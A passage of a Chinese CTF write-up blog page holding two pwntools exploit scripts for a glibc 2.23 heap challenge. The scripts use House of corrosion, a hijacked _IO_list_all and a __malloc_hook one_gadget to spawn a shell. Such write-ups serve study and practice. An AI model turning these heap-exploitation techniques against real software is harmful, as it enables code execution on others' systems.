class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content length:\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content:&quot;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Content id:\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">addr</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Comment:\\n&quot;</span>)</span><br><span class=\"line\">  s(addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_heap_addr</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&quot;2019&quot;</span>)</span><br><span class=\"line\">  heap_list=ru(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">  heap_list=<span class=\"built_in\">int</span>(heap_list[<span class=\"number\">2</span>:],<span class=\"number\">16</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> heap_list</span><br><span class=\"line\"></span><br><span class=\"line\">heap_list=get_heap_addr()</span><br><span class=\"line\">elfbase=heap_list-<span class=\"number\">0x202040</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&quot;aaaaaaaa&quot;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\">libcbase=uu64(ru(<span class=\"string\">&quot;\\x7f&quot;</span>))-<span class=\"number\">3951480</span> </span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0x140</span></span><br><span class=\"line\"></span><br><span class=\"line\">global_max_fast=libcbase+<span class=\"number\">0x3c67f8</span></span><br><span class=\"line\">_IO_list_all=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_list_all&#x27;</span>]</span><br><span class=\"line\">fastbinsY=libcbase+libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]+<span class=\"number\">0x10</span>+<span class=\"number\">0x8</span></span><br><span class=\"line\">chunk_size=(_IO_list_all-fastbinsY)*<span class=\"number\">2</span>+<span class=\"number\">0x20</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># construct fake prev_size and size to bypass unlink when add</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;c&#x27;</span> * <span class=\"number\">0x28</span> + p64(<span class=\"number\">0xd8</span>) + p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># update the size</span></span><br><span class=\"line\">delete(<span class=\"number\">4</span>)</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">add(chunk_size,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># delete 1 and overwrite its size to 0xde</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(heapbase+<span class=\"number\">0xa8</span>-<span class=\"number\">0x3</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x90</span>+p64(<span class=\"number\">0</span>)+p64(chunk_size+<span class=\"number\">0x10</span>+<span class=\"number\">0xa1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0xa8</span>,payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5 will not exist, put all free chunk to small bin to prevent unexpected error</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Content length:\\n&quot;</span>)</span><br><span class=\"line\">sl(<span class=\"built_in\">str</span>(<span class=\"number\">0x100</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;g&#x27;</span>*<span class=\"number\">0x90</span>+p64(<span class=\"number\">0</span>)+p64(chunk_size+<span class=\"number\">0x11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x14a0</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write global_max_fast to 0xdead</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(global_max_fast-<span class=\"number\">0x2</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># House of corrosion</span></span><br><span class=\"line\"><span class=\"comment\"># hijack _IO_list_all</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\"># construct fake io</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(sys_addr)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span></span><br><span class=\"line\">fake_io=<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>+p64(<span class=\"number\">0x1411</span>)</span><br><span class=\"line\">fake_io+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">fake_io=fake_io.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io+=p64(heapbase+<span class=\"number\">0x150</span>) <span class=\"comment\"># vtable</span></span><br><span class=\"line\">payload+=fake_io</span><br><span class=\"line\"><span class=\"comment\"># overwrite 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x14b0</span>-<span class=\"number\">0x10</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&quot;heap_list&quot;</span>,<span class=\"built_in\">hex</span>(heap_list))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;elfbase&quot;</span>,<span class=\"built_in\">hex</span>(elfbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapbase&quot;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;global_max_fast&quot;</span>,<span class=\"built_in\">hex</span>(global_max_fast))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;_IO_list_all&quot;</span>,<span class=\"built_in\">hex</span>(_IO_list_all))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;fastbinsY&quot;</span>,<span class=\"built_in\">hex</span>(fastbinsY))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;chunk_size&quot;</span>,<span class=\"built_in\">hex</span>(chunk_size))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;sys_addr&quot;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># trigger</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"其他思路\"><a href=\"#其他思路\" class=\"headerlink\" title=\"其他思路\"></a>其他思路</h2><p>如果按照main的思路走的话，一直到overlapping都是一样的，但overlapping的<code>chunk</code>的<code>size</code>有所不同，这里需要另其为<code>0xd0</code>，这样才能通过任意地址写<code>0xde</code>来伪造<code>size</code>。</p>\n<p>首先需要利用任意地址写<code>0xde</code>修改<code>global_max_fast</code>，让<code>0xd0</code>大小的<code>chunk</code>都能被认为是<code>fast bin chunk</code>，之后将overlapping的大小为<code>0xd0</code>的<code>chunk</code>释放到越界的<code>fast bin</code>中。</p>\n<p>打<code>__malloc_hook</code>的话，由于只能任意地址写<code>0xde</code>来伪造<code>size</code>，需要在<code>__malloc_hook</code>前面找一段<code>0x0000000000000000</code>的空间来伪造<code>size</code>。</p>\n<p>伪造好后利用overlapping修改<code>0xd0</code>大小的<code>fast bin</code>中<code>chunk</code>的<code>fd==fake_chunk</code>，之后申请两次即可得到<code>__malloc_hook</code>处的内存，修改其为<code>one_gadget</code>即可<code>get shell</code>。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>,arch = <span class=\"string\">&#x27;amd64&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">       </span><br><span class=\"line\">mode = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">1</span>:</span><br><span class=\"line\">    fang = process(<span class=\"string\">&quot;./heap2019&quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    fang = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">28812</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">    gdb.attach(fang)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc2</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Content length:\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">size,cont</span>):</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Content length:\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Content:\\n&quot;</span>)</span><br><span class=\"line\">    fang.send(cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Content id:\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">cont</span>):</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Comment:\\n&quot;</span>)</span><br><span class=\"line\">    fang.send(cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/home/functionmain/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(fang,&#x27;b *(0x555555400000 + 0xc1d)&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\">fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2019</span>))</span><br><span class=\"line\">fang.recvuntil(<span class=\"string\">&quot;0x&quot;</span>)</span><br><span class=\"line\">elf_base = <span class=\"built_in\">int</span>(fang.recv(<span class=\"number\">12</span>),<span class=\"number\">16</span>) - <span class=\"number\">0x202040</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x98</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x98</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">pd = <span class=\"string\">b&#x27;b&#x27;</span> * <span class=\"number\">0x98</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,pd) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">pd = <span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,pd) <span class=\"comment\"># 4</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,<span class=\"string\">b&#x27;a&#x27;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">fang.recvuntil(<span class=\"string\">&quot;Data is:\\n&quot;</span>)</span><br><span class=\"line\">libc_base = u64(fang.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x3c4b61</span></span><br><span class=\"line\">one_gadget4 = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]</span><br><span class=\"line\">one_gadget_addr = libc_base + one_gadget4[<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,<span class=\"string\">b&#x27;aaaaaaaa&#x27;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">fang.recvuntil(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\">heap_base = u64(fang.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x140</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 是0x28且size是0xd8是因为前一个chunk的size被修改为0xde，除去标志位的size就是0xd8，而寻找下一个chunk是依靠size的大小的</span></span><br><span class=\"line\"><span class=\"comment\"># 因此会认为chunk_addr+size，所以会找到0xd8的位置，并认为他是prev_size</span></span><br><span class=\"line\"><span class=\"comment\"># 正常情况下size都是0x10对齐的(64bit下)，但这里不是，所以会出现这样的情况</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;b&#x27;</span> * <span class=\"number\">0x28</span> + p64(<span class=\"number\">0xd8</span>) + p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(heap_base + <span class=\"number\">0xa8</span> - <span class=\"number\">3</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 余下的要大于MIN_SIZE才会切割，顺便改写id==2的size</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x90</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x141</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0xa8</span>,payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">alloc2(<span class=\"number\">0x98</span>) <span class=\"comment\"># 5 马上free的，只是把unsorted剩下的赶进去small bin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 放进 unsorted bin</span></span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x90</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xd1</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x130</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改 global_max_fast</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(libc_base + <span class=\"number\">0x3c67f8</span> - <span class=\"number\">3</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进入 fastbinsY，越界写到了last_remainder</span></span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在__malloc_hook前伪造size</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span 